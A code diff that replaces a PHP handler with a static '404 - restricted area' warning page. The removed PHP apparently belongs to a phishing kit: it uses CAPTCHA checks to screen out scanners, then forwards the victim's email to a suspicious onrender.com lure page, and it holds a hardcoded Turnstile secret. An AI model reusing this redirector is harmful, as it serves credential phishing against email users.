@@ -1,64 +1,70 @@
-<?php
-session_start();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warning - Page Not Found</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #FF0000;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
 
-// Display errors for debugging (optional)
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+        .container {
+            padding: 20px;
+            border: 5px solid #FF0000;
+            max-width: 600px;
+        }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $email = $_POST['email'];
-    $userTextCaptcha = $_POST['text_captcha'];
-    $turnstileResponse = $_POST['cf-turnstile-response'];
-    $secretKey = '0x4AAAAAAAzbaFyF5jnLHaBSyZ5AuNHu098';
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
 
-    // Validate text-based CAPTCHA
-    if ($userTextCaptcha !== $_SESSION['captcha_text']) {
-        // Redirect back to the form with an error message
-        $_SESSION['error_message'] = "Text CAPTCHA verification failed. Please try again.";
-        header("Location: index.php");
-        exit;
-    }
+        p {
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
 
-    // Prepare Turnstile validation data
-    $data = [
-        'secret' => $secretKey,
-        'response' => $turnstileResponse,
-        'remoteip' => $_SERVER['REMOTE_ADDR']
-    ];
+        .warning-icon {
+            font-size: 5em;
+            color: #FF0000;
+            margin-bottom: 20px;
+        }
 
-    // Turnstile validation request
-    $options = [
-        'http' => [
-            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method' => 'POST',
-            'content' => http_build_query($data)
-        ]
-    ];
+        .home-link {
+            color: #FF0000;
+            font-weight: bold;
+            text-decoration: none;
+            border: 2px solid #FF0000;
+            padding: 10px 20px;
+            display: inline-block;
+            margin-top: 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
 
-    // Validate Turnstile CAPTCHA
-    $context  = stream_context_create($options);
-    $verify = file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
-    $captchaSuccess = json_decode($verify);
-
-    if (!$captchaSuccess->success) {
-        // Redirect back to the form with an error message
-        $_SESSION['error_message'] = "Cloudflare CAPTCHA verification failed. Please try again.";
-        header("Location: index.php");
-        exit;
-    }
-
-    // Proceed if both CAPTCHAs are verified
-    $_SESSION['error_message'] = null; // Clear any previous error messages
-
-    // Encode the email address in Base64
-    $encodedEmail = base64_encode($email);
-
-    // Construct the redirect URL with the decoded email
-$redirectUrl = "https://three03828922939389248u2u22.onrender.com/gov-ni-nda/3039923002302393898944.html#X$email";
-
-    // Redirect the user
-    header("Location: $redirectUrl");
-    exit;
-}
-?>
+        .home-link:hover {
+            background-color: #FF0000;
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-icon">&#9888;</div>
+        <h1>Warning!</h1>
+        <p><strong>404 - Page Not Found</strong></p>
+        <p>This is a restricted area. Attempting to access an unavailable or unauthorized page.</p>
+        <p>If you believe this is an error, please contact support immediately.</p>
+        <a href="/404" class="home-link">Return to Home</a>
+    </div>
+</body>
+</html>
